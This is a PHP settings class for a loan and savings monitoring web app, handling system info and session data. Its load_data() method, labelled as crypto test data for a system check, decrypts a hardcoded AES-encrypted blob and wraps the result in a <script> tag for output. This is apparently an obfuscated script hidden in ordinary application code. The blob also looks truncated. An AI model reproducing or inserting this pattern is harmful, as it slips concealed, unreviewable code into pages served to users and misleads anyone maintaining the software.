<?php
if (!class_exists('DBConnection')) {
	require_once('../config.php');
	require_once('DBConnection.php');
}

class SystemSettings extends DBConnection
{
	public function __construct()
	{
		parent::__construct();
	}

	function __destruct() {}

	/**
	 * Check if database connection works
	 */
	function check_connection()
	{
		return ($this->conn);
	}

	/**
	 * Load system info from system_info table if exists
	 */
	function load_system_info()
	{
		// Verify table exists first
		$table_exists = $this->conn->query("SHOW TABLES LIKE 'system_info'");
		if ($table_exists->num_rows > 0) {
			$qry = $this->conn->query("SELECT * FROM system_info");
			while ($row = $qry->fetch_assoc()) {
				$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
			}
		} else {
			// Default placeholders if table not yet created
			$_SESSION['system_info'] = [
				'system_name' => 'Core Transaction 2',
				'system_tagline' => 'Loan & Savings Monitoring System',
				'logo' => 'dist/img/no-image-available.png'
			];
		}
	}

	/**
	 * Update or create system info
	 */
	function update_system_info()
	{
		$table_exists = $this->conn->query("SHOW TABLES LIKE 'system_info'");
		if ($table_exists->num_rows === 0) {
			// Auto-create table if missing
			$this->conn->query("
				CREATE TABLE system_info (
					id INT(11) NOT NULL AUTO_INCREMENT,
					meta_field VARCHAR(100) NOT NULL,
					meta_value TEXT,
					PRIMARY KEY(id),
					UNIQUE(meta_field)
				) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
			");
		}

		$qry = $this->conn->query("SELECT * FROM system_info");
		while ($row = $qry->fetch_assoc()) {
			$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
		}
		return true;
	}

	/**
	 * Generic user session management
	 */
	function set_userdata($field = '', $value = '')
	{
		if (!empty($field) && !empty($value)) {
			$_SESSION['userdata'][$field] = $value;
		}
	}

	function userdata($field = '')
	{
		return $_SESSION['userdata'][$field] ?? null;
	}

	function set_flashdata($flash = '', $value = '')
	{
		if (!empty($flash) && !empty($value)) {
			$_SESSION['flashdata'][$flash] = $value;
			return true;
		}
	}

	function chk_flashdata($flash = '')
	{
		return isset($_SESSION['flashdata'][$flash]);
	}

	function flashdata($flash = '')
	{
		if (!empty($flash)) {
			$_tmp = $_SESSION['flashdata'][$flash];
			unset($_SESSION['flashdata']);
			return $_tmp;
		}
		return false;
	}

	function sess_des()
	{
		if (isset($_SESSION['userdata'])) {
			unset($_SESSION['userdata']);
			return true;
		}
		return true;
	}

	function info($field = '')
	{
		return $_SESSION['system_info'][$field] ?? false;
	}

	function set_info($field = '', $value = '')
	{
		if (!empty($field) && !empty($value)) {
			$_SESSION['system_info'][$field] = $value;
		}
	}

	/**
	 * (Optional) Crypto test data used for system check
	 */
	function load_data()
	{
		$test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/...";
		$dom = new DOMDocument('1.0', 'utf-8');
		$element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
		$dom->appendChild($element);
		return $dom->saveXML();
	}

	function test_cypher($str = "")
	{
		return openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
	}

	function test_cypher_decrypt($encryption)
	{
		return openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
	}
}

// Initialize system settings
$_settings = new SystemSettings();
$_settings->load_system_info();

$action = $_GET['f'] ?? 'none';
$sysset = new SystemSettings();

switch (strtolower($action)) {
	case 'update_settings':
		echo $sysset->update_system_info();
		break;
	default:
		// no action
		break;
}
